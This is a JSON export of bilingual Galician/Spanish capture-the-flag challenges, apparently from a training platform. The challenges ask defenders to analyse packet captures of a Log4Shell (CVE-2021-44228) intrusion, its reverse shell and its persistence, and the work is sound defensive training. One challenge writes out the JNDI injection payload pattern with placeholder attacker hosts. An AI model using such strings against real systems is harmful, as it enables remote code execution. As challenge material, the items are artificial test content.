{"count":42,"results":[{"id":231,"name":"N\u00ba de paquetes","description":"**Cantos paquetes ten a captura?**\r\n\r\n------\r\n\r\n\u00bfCu\u00e1ntos paquetes tiene la captura?","max_attempts":0,"value":50,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":232,"name":"Inicio captura","description":"**A que hora capturouse o primeiro paquete?.** \r\n\r\nNOTA: tempo UTC e formato de resposta:  aaaa-mm-dd  hh:mm: ss\r\n\r\n------\r\n\r\n\u00bfA qu\u00e9 hora se captur\u00f3 el primer paquete?. \r\n\r\nNOTA: tiempo UTC y formato de respuesta: aaaa-mm-dd hh:mm:ss","max_attempts":0,"value":50,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":233,"name":"Duraci\u00f3n captura","description":"**Duraci\u00f3n da captura?.**\r\n\r\nFormato: hh:mm:ss\r\n\r\n------\r\n\r\n\u00bfDuraci\u00f3n de la captura?.\r\n\r\nFormato: hh:mm:ss","max_attempts":0,"value":50,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":234,"name":"Equipo mais activo a L2","description":"**Cal \u00e9 o equipo m\u00e1is activo a nivel de enlace?.**\r\n\r\nFormato: xx:xx:xx:xx:xx:xx\r\n\r\n------\r\n\r\n\u00bfCu\u00e1l es el equipo m\u00e1s activo a nivel de enlace?.\r\n\r\nFormato: xx:xx:xx:xx:xx:xx","max_attempts":2,"value":50,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":235,"name":"Fabricante NIC","description":"**Fabricante da  NIC do equipo m\u00e1is activo a nivel de enlace**\r\n\r\n------\r\n\r\nFabricante de la NIC del equipo m\u00e1s activo a nivel de enlace","max_attempts":0,"value":50,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"hidden","requirements":null,"connection_info":null,"next_id":null},{"id":236,"name":"Sede","description":"**Cidade onde est\u00e1 a sede do fabricante da NIC do equipo m\u00e1is activo a nivel de enlace**\r\n\r\n------\r\n\r\nCiudad donde est\u00e1 la sede del fabricante de la NIC del equipo m\u00e1s activo a nivel de enlace","max_attempts":0,"value":50,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"hidden","requirements":null,"connection_info":null,"next_id":null},{"id":237,"name":"Protocolo mais activo a L7","description":"**Tendo en conta o modelo TCP/IP, Que protocolo de nivel de aplicaci\u00f3n da captura \u00e9 o m\u00e1is activo?**\r\n\r\nFormato: nome do protocolo (siglas do protocolo)\r\n\r\n------\r\n\r\nTeniendo en cuenta el modelo TCP/IP, \u00bfQu\u00e9 protocolo de nivel de aplicaci\u00f3n de la captura es el m\u00e1s activo?\r\n\r\nFormato: nombre del protocolo (siglas del protocolo)","max_attempts":0,"value":50,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":238,"name":"N\u00ba equipos da organizaci\u00f3n","description":"**A organizaci\u00f3n traballa con direccionamento privado. Cantos equipos da organizaci\u00f3n interve\u00f1en na captura?.**\r\n\r\n------\r\n\r\nLa organizaci\u00f3n trabaja con direccionamiento privado. \u00bfCu\u00e1ntos equipos de la organizaci\u00f3n intervienen en la captura?.","max_attempts":3,"value":75,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":239,"name":"Equipo mais activo a L3","description":"**Equipo mais activo a nivel de rede?.**\r\n\r\nFormato: x.x.x.x <-- indica a IP\r\n\r\n------\r\n\r\n\u00bfEquipo m\u00e1s activo a nivel de red?.\r\n\r\nFormato: x.x.x.x <-- indica la IP","max_attempts":0,"value":75,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":240,"name":"Paquetes dende China","description":"**Cantos paquetes te\u00f1en orixe China?**\r\n\r\n------\r\n\r\n\u00bfCu\u00e1ntos paquetes tienen origen China?","max_attempts":3,"value":100,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":241,"name":"Equipos de USA","description":"**Cantos equipos usan  IPs situadas en Estados Unidos?**\r\n\r\n------\r\n\r\n\u00bfCu\u00e1ntos equipos usan IPs ubicadas en Estados Unidos?","max_attempts":3,"value":100,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":242,"name":"Petici\u00f3ns maliciosas","description":"**Sabendo que as petici\u00f3ns http maliciosas para explotar Log4 shell te\u00f1en a forma** `${jndi:ldap://<servidor del atacante>/<payload>}` **ou** `${jndi:dns://dns-server-ip/evil-request}`. **Cantas petici\u00f3ns maliciosas hai na captura?**\r\n\r\n------\r\n\r\nSabiendo que las peticiones http maliciosas para explotar Log4shell tienen la forma ${jndi:ldap://<servidor del atacante>/<payload>} o ${jndi:dns://dns-server-ip/evil-request}. \u00bfCu\u00e1ntas peticiones maliciosas hay en la captura?","max_attempts":3,"value":100,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":243,"name":"IP da v\u00edtima","description":"**Cal \u00e9 a IP do equipo v\u00edtima?**\r\n\r\nFormato: X.X.X.X\r\n\r\n------\r\n\r\n\u00bfCu\u00e1l es la IP del equipo v\u00edctima?\r\n\r\nFormato: X.X.X.X","max_attempts":0,"value":100,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":244,"name":"Servidor LDAP malicioso","description":"**Cal \u00e9 a IP e o porto de escoita do servidor LDAP do atacante?** \r\n\r\nFormato: IP:porto\r\n\r\n------\r\n\r\n\u00bfCu\u00e1l es la IP y el puerto de escucha del servidor LDAP del atacante?\r\n\r\nFormato: IP:puerto","max_attempts":0,"value":100,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":245,"name":"Conversaci\u00f3ns v\u00edtima-servidor LDAP","description":"**N\u00ba de paquetes intercambiados entre o equipo v\u00edtima e o servidor LDAP remoto do atacante onde interve\u00f1a o porto tcp do servidor ldap indicado na petici\u00f3n maliciosa?**\r\n\r\n------\r\n\r\n\u00bfN\u00ba de paquetes intercambiados entre el equipo v\u00edctima y el servidor LDAP remoto del atacante donde intervenga el puerto tcp del servidor ldap indicado en la petici\u00f3n maliciosa?","max_attempts":0,"value":150,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":246,"name":"Dissectors e mensaxes LDAP","description":"**Configurando os  *dissectores* de  Wirehark, cantos paquetes aparecen marcados como paquetes do protocolo LDAP por Wireshark?**\r\n\r\n------\r\n\r\nConfigurando los dissectores de Wirehark, \u00bfcu\u00e1ntos paquetes aparecen marcados como paquetes del protocolo LDAP por Wireshark?","max_attempts":5,"value":150,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":247,"name":"Clase Java maliciosa","description":"**Indica o n\u00ba de paquete onde se indica a localizaci\u00f3n do obxecto java malicioso**\n\n------\n\nIndica el n\u00ba de paquete donde se indica la ubicaci\u00f3n del objeto java malicioso","max_attempts":0,"value":175,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":248,"name":"Java Exploit","description":"**Indica a localizaci\u00f3n do obxecto java Exploit.**\r\n\r\nFormato: protocolo://direcci\u00f3n:porto\r\n\r\n------\r\n\r\nIndica la ubicaci\u00f3n del objeto java Exploit. \r\n\r\nFormato: protocolo://direcci\u00f3n:puerto","max_attempts":0,"value":175,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":249,"name":"Versi\u00f3n Java","description":"**Que versi\u00f3n de Java corre o equipo v\u00edtima?.**\r\n\r\nFormato: Java/versi\u00f3n_revisi\u00f3n\r\n\r\n------\r\n\r\n\u00bfQu\u00e9 versi\u00f3n de java corre el equipo v\u00edctima?. \r\n\r\nFormato: Java/versi\u00f3n_revisi\u00f3n","max_attempts":0,"value":175,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":250,"name":"Servidor web do atacante","description":"**Que servidor Web corre o atacante?**\r\n\r\nFormato: XXXXXXXXXX/X.X XXXXXX/X.X.X\r\n\r\n------\r\n\r\n\u00bfQu\u00e9 servidor Web corre el atacante?\r\n\r\nFormato: XXXXXXXXXX/X.X XXXXXX/X.X.X","max_attempts":0,"value":175,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":251,"name":"\u00bfBind ou reverse Shell?","description":"**O obxecto java malicioso desencadea a execuci\u00f3n dunha bind shell ou dunha reverse shell?**\r\n\r\nFormato: indicar *bind shell* ou *reverse shell* segundo corresponda\r\n\r\n------\r\n\r\n\u00bfEl objeto java malicioso desencadena la ejecuci\u00f3n de una bind shell o de una reverse shell?\r\n\r\nFormato: indicar *bind shell* o *reverse shell* seg\u00fan corresponda","max_attempts":1,"value":175,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":252,"name":"Socket da Shell","description":"**Socket do equipo atacante asociado \u00e1 shell anterior.**\r\n\r\nFormato: IP:porto\r\n\r\n------\r\n\r\nSocket del equipo atacante asociado a la shell anterior. \r\n\r\nFormato: IP:puerto","max_attempts":0,"value":175,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":253,"name":"Command and Control","description":"**N\u00ba de paquetes intercambiados entre v\u00edtima e atacante asociados \u00e1 shell**\n\n------\n\nN\u00ba de paquetes intercambiados entre v\u00edctima y atacante asociados a la shell","max_attempts":5,"value":175,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":254,"name":"\u00bfPrimeiro comando?","description":"**Cal foi o primeiro comando executado polo asaltante no equipo v\u00edtima mediante a shell?**\r\n\r\n------\r\n\r\n\u00bfCu\u00e1l fue el primer comando ejecutado por el asaltante en el equipo v\u00edctima mediante la shell?","max_attempts":0,"value":200,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":255,"name":"Paquete do primeiro comando","description":"**N\u00ba do paquete no que viaxa o primeiro comando executado polo asaltante no equipo v\u00edtima mediante a shell**\n\n------\n\nN\u00ba del paquete en el que viaja el primer comando ejecutado por el asaltante en el equipo v\u00edctima mediante la shell","max_attempts":0,"value":200,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":256,"name":"Usuario no sistema v\u00edtima","description":"**Con que usuario logrou acceder o atacante no equipo v\u00edtima?**\n\n------\n\n\u00bfCon qu\u00e9 usuario logr\u00f3 acceder el atacante en el equipo v\u00edctima?","max_attempts":0,"value":200,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":257,"name":"Directorio no sistema v\u00edtima","description":"**Directorio no que est\u00e1 o atacante dentro do equipo v\u00edtima?**\n\n------\n\n\u00bfDirectorio en el que est\u00e1 el atacante dentro del equipo v\u00edctima?","max_attempts":0,"value":200,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":258,"name":"IPv6","description":"**Cal \u00e9 a direcci\u00f3n  IPv6 do equipo v\u00edtima?**\r\n\r\nFormato:  dirIPv6/m\u00e1scara\r\n\r\n------\r\n\r\n\u00bfCu\u00e1l es la direcci\u00f3n IPv6 del equipo v\u00edctima? \r\n\r\nFormato: dirIPv6/m\u00e1scara","max_attempts":0,"value":200,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":259,"name":"HTTP e LDAP","description":"**N\u00ba de paquetes http e ldap intercambiados entre o equipo v\u00edtima e o atacante?**\r\n\r\nNota: paquetes reco\u00f1ecidos por Wireshark como http e ldap\r\n\r\n------\r\n\r\n\u00bfN\u00ba de paquetes http y ldap intercambiados entre el equipo v\u00edctima y el atacante?\r\n\r\nNota: paquetes reconocidos por Wireshark como http y ldap","max_attempts":0,"value":200,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":260,"name":"\u00bfUn server inicia conexi\u00f3ns?","description":"**N\u00ba de conexi\u00f3ns tcp iniciadas polo servidor v\u00edtima?**\n\n------\n\n\u00bfN\u00ba de conexiones tcp iniciadas por el servidor v\u00edctima?","max_attempts":2,"value":200,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":261,"name":"Chamando a casa","description":"**Sosp\u00e9itase que o atacante estableceu un mecanismo de persistencia usando algunha das subt\u00e9cnicas da t\u00e9cnica [T1053 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) da [matriz Mitre ATT&CK](https://attack.mitre.org/). Cada cantos minutos contacta o equipo v\u00edtima co equipo atacante?**\r\n\r\nFormato: n\u00ba de minutos (p.e. *10*)\r\n\r\n------\r\n\r\nSe sospecha que el atacante ha establecido un mecanismo de persistencia usando alguna de las subt\u00e9cnicas de la t\u00e9cnica [T1053 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)  de la [matriz Mitre ATT&CK](https://attack.mitre.org/) \u00bfCada cu\u00e1ntos minutos contacta el equipo v\u00edctima con el equipo atacante?\r\n\r\nFormato: n\u00ba de minutos (p.e. *10*)","max_attempts":5,"value":150,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":262,"name":"Atacante","description":"**Cal \u00e9 a IP do equipo do atacante ao que chama a v\u00edtima regularmente?**\n\n------\n\n\u00bfCu\u00e1l es la IP del equipo del atacante al que llama la v\u00edctima regularmente?","max_attempts":0,"value":150,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":263,"name":"Enumerar: preparando a elevaci\u00f3n de privilexios","description":"**Que ferramenta ou script de enumeraci\u00f3n empregou o atacante?**\r\n\r\nFormato: nome da ferramenta ou script\r\n\r\n------\r\n\r\n\u00bfQu\u00e9 herramienta o script de enumeraci\u00f3n ha empleado el atacante?\r\n\r\nFormato: nombre de la herramienta o script","max_attempts":0,"value":150,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":264,"name":"Kernel","description":"**Cal \u00e9 a versi\u00f3n do  kernel da m\u00e1quina v\u00edtima?**\r\n\r\nFormato: x.x.x- xx- generic\r\n\r\n------\r\n\r\n\u00bfCu\u00e1l es la versi\u00f3n del kernel de la m\u00e1quina v\u00edctima?\r\n\r\nFormato: x.x.x-xx-generic","max_attempts":0,"value":150,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":265,"name":"Linux","description":"**Que distribuci\u00f3n Linux e versi\u00f3n est\u00e1 a correr a m\u00e1quina v\u00edtima?**\r\n\r\nFormato: nome xx.xx.x\r\n\r\n------\r\n\r\n\u00bfQu\u00e9 distribuci\u00f3n Linux y versi\u00f3n est\u00e1 corriendo la m\u00e1quina v\u00edctima?\r\n\r\nFormato: nombre xx.xx.x","max_attempts":0,"value":150,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":266,"name":"Persistencia como solr","description":"**Como se chama o programa/script que se executa para lograr a persistencia como usuario  solr? Indica a ruta completa**\r\n\r\nFormato: /xxx/xxxx/xxxxxx.xx\r\n\r\n------\r\n\r\n\u00bfC\u00f3mo se llama el programa/script que se ejecuta para lograr la persistencia como usuario solr? Indica la ruta completa\r\n\r\nFormato: /xxx/xxxx/xxxxxx.xx","max_attempts":0,"value":200,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":267,"name":"Game Over","description":"**Que vulnerabilidade aproveita o atacante para promocionar a  root?**\r\n\r\nFormato:  CVE- XXXX- XXXX\r\n\r\n------\r\n\r\n\u00bfQu\u00e9 vulnerabilidad aprovecha el atacante para promocionar a root?\r\n\r\nFormato: CVE-XXXX-XXXX","max_attempts":0,"value":250,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":268,"name":"Persistencia como root","description":"**Que t\u00e9cnica de persistencia usa o atacante unha vez que conseguiu promocionar a  root?**\r\n\r\nFormato:  Txxxx.xxx <-- indica o ID da subt\u00e9cnica segundo a [matriz  MITRE  ATT& CK](https://attack.mitre.org/)\r\n\r\n------\r\n\r\n\u00bfQu\u00e9 t\u00e9cnica de persistencia usa el atacante una vez que ha conseguido promocionar a root?\r\n\r\nFormato:  Txxxx.xxx <--  indica el ID de la subt\u00e9cnica seg\u00fan la [matriz MITRE ATT&CK](https://attack.mitre.org/)","max_attempts":0,"value":250,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":269,"name":"Acceso remoto","description":"**Indica o  n.\u00ba de paquete no que se inicia unha conexi\u00f3n  ssh cara \u00e1 v\u00edtima desde unha IP da organizaci\u00f3n do atacante**\n\n------ \n\nIndica el n.\u00ba de paquete en el que se inicia una conexi\u00f3n ssh hacia la v\u00edctima desde una IP de la organizaci\u00f3n del atacante","max_attempts":0,"value":250,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":270,"name":"Usuarios de bash","description":"**Cantos usuarios do sistema v\u00edtima te\u00f1en como  shell /bin/bash?**\r\n\r\n------\r\n\r\n\u00bfCu\u00e1ntos usuarios del sistema v\u00edctima tienen como shell /bin/bash?\r\n","max_attempts":3,"value":200,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":271,"name":"Intro Explotac\u00ed\u00f3n","description":"**Como analista do SOC (Security Operations Center) investiga o tr\u00e1fico de rede para determinar se houbo incidentes relativos a Log4shell na t\u00faa organizaci\u00f3n. Usa os teus co\u00f1ecementos de Wireshark, analiza o arquivo de captura log4j.pcapng e resposta \u00e1s seguintes cuesti\u00f3ns.**\r\n\r\n**Unha vez descargado o arquivo log4j.pcap, indica como resposta OK e pasa \u00e1 seguinte pregunta.**\r\n\r\n----\r\n\r\nComo analista del SOC (Security Operations Center) investiga el tr\u00e1fico de red para determinar si hubo incidentes relativos a Log4shell en tu organizaci\u00f3n. Usa tus conocimientos de Wireshark, analiza el archivo de captura log4j.pcapng y constesta a las siguientes preguntas.\r\n\r\nUna vez descargado el archivo log4j.pcap, marca como respuesta OK y pasa a la siguiente pregunta.","max_attempts":0,"value":25,"category":"Log4shell: explotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null},{"id":272,"name":"Intro postexplotaci\u00f3n","description":"**Da investigaci\u00f3n anterior, sabemos que o incidente est\u00e1 confirmado e un atacante aproveitou a vulnerabilidade CVE-2021-44228 para acceder \u00f3 sistema coma  un usuario non privilexiado. O teu traballo \u00e9 abrir o arquivo postexplotacion_log4j.pcapng e continuar a investigaci\u00f3n para descubrir que acci\u00f3ns realizou o adversario.**\r\n\r\n**Unha vez descargado o arquivo postexplotacion_log4j.pcap, indica como resposta OK e pasa \u00e1 seguinte pregunta.**\r\n\r\n\r\n----\r\n\r\nDe la investigaci\u00f3n anterior, sabemos que el incidente est\u00e1 confirmado y un atacante aprovech\u00f3 la vulnerabilidad CVE-2021-44228 para acceder al sistema como  un usuario no privilegiado. Tu trabajo es abrir el archivo postexplotacion_log4j.pcapng y continuar la investigaci\u00f3n para descubrir que acciones realiz\u00f3 e adversario.\r\n\r\nUna vez descargado el archivo postexplotacion_log4j.pcap, indica como respuesta OK y pasa a la siguiente pregunta.","max_attempts":0,"value":0,"category":"Log4shell: postexplotaci\u00f3n","type":"standard","state":"visible","requirements":null,"connection_info":null,"next_id":null}],"meta":{}}